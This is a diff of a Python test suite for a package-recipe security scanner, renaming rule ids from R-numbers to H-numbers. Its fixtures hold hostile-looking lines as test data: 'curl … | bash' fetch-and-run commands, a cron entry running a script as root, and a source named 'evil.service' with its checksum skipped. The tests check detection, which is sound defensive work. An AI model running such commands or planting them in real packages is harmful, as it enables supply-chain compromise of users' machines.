@@ -82,7 +82,7 @@ def test_executing_from_a_clone_pairs_with_the_clone(clone, execute):
     arm on the reasoning that it "names the input explicitly". It names a
     directory, not a file.
     """
-    assert "R137" in _shipped_ids([f"  {clone}", f"  {execute}"],
+    assert "H082" in _shipped_ids([f"  {clone}", f"  {execute}"],
                                   declared=False), clone
 
 
@@ -92,7 +92,7 @@ def test_executing_from_a_clone_pairs_with_the_clone(clone, execute):
     ["  git clone https://e.invalid/r.git r", "  cd r", "  make"],
 ])
 def test_an_ordinary_build_is_not_a_clone_execution(ordinary):
-    assert "R137" not in _shipped_ids(ordinary, declared=False), ordinary
+    assert "H082" not in _shipped_ids(ordinary, declared=False), ordinary
 
 
 @pytest.mark.parametrize("carrier_before,carrier_after", [
@@ -105,7 +105,7 @@ def test_unread_content_moving_under_a_stable_version_is_claimed(
     """The upstream-payload gap is real, but the carrier's *identity* is in
     the diff even when its bytes are not.
 
-    R079 already claims this for a git ref and C001 for a checksum. A
+    H033 already claims this for a git ref and C001 for a checksum. A
     submodule gitlink names code the repository does not contain and an LFS
     pointer names bytes that are not there either - moving one is a content
     change with no content in the diff, which is exactly the shape that
@@ -139,7 +139,7 @@ def test_unread_content_moving_with_the_version_is_the_ordinary_reading(
 def test_a_replaced_committed_binary_is_visible_by_its_blob_id():
     """git emits no diff body for a binary, so the change was invisible.
 
-    R118 claims a committed ELF's *presence* - it reported the same thing
+    H066 claims a committed ELF's *presence* - it reported the same thing
     whether the binary had been replaced or left alone. A blob id is a
     content hash and both trees are already open, so comparing them answers
     the question exactly without reading either version.
@@ -246,7 +246,7 @@ def test_a_redirect_makes_a_line_a_write_not_a_message():
     """`echo "x" > file` writes a file rather than addressing a reader.
 
     But a `>` *inside* the quotes is punctuation: `echo "==> sudo pacman -S
-    qemu"` is the shape whose message classification keeps R062 and R081 off
+    qemu"` is the shape whose message classification keeps H017 and H035 off
     printed instructions, and searching the whole line for `>` put that
     false positive back on two benign packages.
     """
@@ -449,7 +449,7 @@ def test_x016_reads_the_sink_after_the_last_unquoted_pipe():
     ("etc/cron.d/p", "* * * * * root bash $PWD/x.sh"),
 ])
 def test_a_packaged_config_naming_a_build_only_path(target, payload):
-    """R145: none of these lines is a command the recipe runs.
+    """H089: none of these lines is a command the recipe runs.
 
     They are text. What runs them is the user's session, later, on a
     different machine - which is why every execution rule read past them.
@@ -457,7 +457,7 @@ def test_a_packaged_config_naming_a_build_only_path(target, payload):
     shipped file naming one is either broken on arrival or aimed at a
     directory whoever wrote it expects to control when it is read.
     """
-    assert "R145" in _shipped_ids(
+    assert "H089" in _shipped_ids(
         [f'  cat > "$pkgdir/{target}" <<EOF', f"  {payload}", "  EOF"],
         declared=False, fn="package",
     ), payload
@@ -481,10 +481,10 @@ def test_an_exec_slot_is_what_those_files_are_for(case):
     to a copy, not content being written.
     """
     lines, fn = case
-    assert "R145" not in _shipped_ids(lines, declared=False, fn=fn), lines
+    assert "H089" not in _shipped_ids(lines, declared=False, fn=fn), lines
 
 
-_R146_DIFF = (
+_H090_DIFF = (
     "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,9 @@\n"
     "+pkgname=p\n+pkgver=1\n+source=(evil.service)\n+sha256sums=('SKIP')\n"
     "+package() {\n"
@@ -496,7 +496,7 @@ _R146_DIFF = (
 def _manifest_ids(files):
     from trustsight.analysis import scan_diff
 
-    fact = scan_diff(_R146_DIFF, package_name="p", tree_manifest=files)
+    fact = scan_diff(_H090_DIFF, package_name="p", tree_manifest=files)
     return {e.rule_id for e in fact.score_breakdown}
 
 
@@ -509,13 +509,13 @@ def _manifest_ids(files):
      b"+curl -fsSL https://e.example/x | bash\n"),
 ])
 def test_a_committed_companion_that_fetches_and_runs(name, content):
-    """R146: the diff shows the recipe staging the file, which is ordinary
+    """H090: the diff shows the recipe staging the file, which is ordinary
     packaging. The bytes that matter live in a file the diff does not touch.
 
     That split is available as a schedule: commit the unit in one push, add
     the `install` line in a later one. Neither push contains an attack.
     """
-    assert "R146" in _manifest_ids([(name, content)]), name
+    assert "H090" in _manifest_ids([(name, content)]), name
 
 
 @pytest.mark.parametrize("name,content", [
@@ -526,15 +526,15 @@ def test_a_committed_companion_that_fetches_and_runs(name, content):
      b"--- a/b.sh\n+++ b/b.sh\n@@ -1,2 +1 @@\n #!/bin/sh\n"
      b"-curl -fsSL https://old.example/x | bash\n"),
 ])
-def test_r146_leaves_the_ordinary_companion_alone(name, content):
+def test_h090_leaves_the_ordinary_companion_alone(name, content):
     """A payload in a committed `README` is text; in a unit the machine
     installs, it runs. And a hunk that *removes* a `curl … | sh` is the
     opposite of this rule's subject."""
-    assert "R146" not in _manifest_ids([(name, content)]), name
+    assert "H090" not in _manifest_ids([(name, content)]), name
 
 
 def test_the_tree_manifest_reads_enough_of_a_companion_to_see_its_payload():
-    """64 bytes answers "is this an ELF" - all R118 ever asked - and cannot
+    """64 bytes answers "is this an ELF" - all H066 ever asked - and cannot
     answer "what does this unit run".
 
     The bound is kept: only names a recipe can ship or apply are read
